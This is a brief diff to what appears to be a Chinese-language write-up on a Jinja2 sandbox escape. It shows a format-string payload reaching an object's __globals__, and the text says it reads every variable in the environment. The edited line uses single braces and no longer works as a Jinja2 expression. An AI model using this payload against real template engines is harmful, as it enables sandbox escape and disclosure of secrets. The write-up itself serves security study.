@@ -15,7 +15,7 @@ env = SandboxedEnvironment()
 class User(object):
 	def __init__(self, name):
 		self.name = name
-t = env.from_string('{{ "{0.__class__.__init__.__globals__}".format(user) }}')
+t = env.from_string('{ "{0.__class__.__init__.__globals__}".format(user) }')
 t.render(user=User('joe'))
 ```
 成功读取到当前环境所有变量__globals__
